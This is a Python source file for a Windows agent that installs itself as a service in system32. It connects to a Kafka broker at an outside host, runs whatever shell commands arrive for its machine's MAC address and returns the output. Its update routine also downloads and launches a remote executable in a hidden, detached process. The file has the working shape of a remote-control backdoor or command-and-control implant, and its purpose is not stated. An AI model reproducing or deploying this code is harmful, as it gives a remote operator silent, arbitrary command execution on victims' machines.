# -*- coding:utf-8 -*-
import uuid
from kafka import KafkaProducer
from kafka import KafkaConsumer
import json
import sys
import os
import time
import shutil
import subprocess
import tempfile
import requests
import hashlib


# https://stackoverflow.com/questions/52449997/how-to-detach-python-child-process-on-windows-without-setsid
if 'nt' == os.name:
    flags = 0
    flags |= 0x00000008  # DETACHED_PROCESS
    flags |= 0x00000200  # CREATE_NEW_PROCESS_GROUP
    flags |= 0x08000000  # CREATE_NO_WINDOW

    pkwargs = {
        'close_fds': True,  # close stdin/stdout/stderr on child
        'creationflags': flags,
    }


class Scmd:
    def __init__(self):
        while True:
            try:
                self.producer = KafkaProducer(**config)
                self.consumer = KafkaConsumer('client', **config)
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break

    @staticmethod
    def install():
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        try:
            shutil.copy(sys.argv[0], os.path.join(sys_dir, 'scmd.exe'))
            shutil.copy(os.path.join(base_path, 'svc.exe'), os.path.join(sys_dir, 'svc.exe'))
            shutil.copy(os.path.join(base_path, 'svc.conf'), os.path.join(sys_dir, 'svc.conf'))
            cmd = '%s install'%(os.path.join(sys_dir,'svc.exe'))
            subprocess.getoutput(cmd)
        except Exception as e:
            print(e)

    @staticmethod
    def update():
        data = requests.get(vc_url).json()
        if data['version'] != version:
            scmd_md5 = data['md5']
            scmd_exe = requests.get(data['url'])
            hash = hashlib.md5()
            with open(os.path.join(tempfile.gettempdir(), 'scmd.exe'), 'wb') as f:
                f.write(scmd_exe.content)
                hash.update(scmd_exe.content)
            if scmd_md5 == hash.hexdigest():
                cmd = '"%s" restart' % (os.path.join(tempfile.gettempdir(), 'scmd.exe'))
                subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **pkwargs)

    @staticmethod
    def restart():
        os.chdir(sys_dir)
        os.rename('scmd.exe', 'scmd-old.exe')
        shutil.copy(os.path.join(tempfile.gettempdir(), 'scmd.exe'), os.path.join(sys_dir, 'scmd.exe'))
        subprocess.Popen('svc restart', stdout=subprocess.PIPE, stderr=subprocess.PIPE, **pkwargs)

    def run(self):
        os.chdir(sys_dir)
        if os.path.isfile('scmd-old.exe'):
            os.remove('scmd-old.exe')

        for msg in self.consumer:
            content = json.loads(str(msg.value, encoding='utf-8'))
            cmd = content['cmd']
            client = content['client']
            if client != mac and client != 'all':
                continue
            if cmd == 'update':
                self.update()
                continue
            elif cmd == 'version':
                body = {'client': mac, 'cmd': cmd, 'result': version, 'time': int(time.time())}
                self.producer.send('ret', json.dumps(body).encode('utf-8'))
                continue
            elif cmd == 'stop':
                subprocess.getoutput('svc stop')
            ret = subprocess.getoutput(cmd)
            body = {'client': mac, 'cmd': cmd, 'result': ret, 'time': int(time.time())}
            self.producer.send('response', json.dumps(body).encode('utf-8'))


if __name__ == '__main__':
    sys_dir = r'C:\WINDOWS\system32'
    version = '1.0.0'
    vc_url = 'http://scmd.10yi.store/vc.json'
    bootstrap_servers = ['scmd.10yi.store:9093']
    mac_num = hex(uuid.getnode()).replace('0x', '').upper()
    mac = ''.join(mac_num[i: i + 2] for i in range(0, 11, 2))
    config = {
        'bootstrap_servers': bootstrap_servers,
        'security_protocol': 'SASL_PLAINTEXT',
        'sasl_mechanism': 'PLAIN',
        'sasl_plain_username': 'username',
        'sasl_plain_password': 'password',
    }
    if len(sys.argv) == 1:
        Scmd.install()
    elif len(sys.argv) == 2:
        scmd = Scmd()
        if sys.argv[1] == '-v' or sys.argv[1] == 'version':
            print(version)
        elif sys.argv[1] == 'restart':
            scmd.restart()
        elif sys.argv[1] == 'start':
            scmd.run()
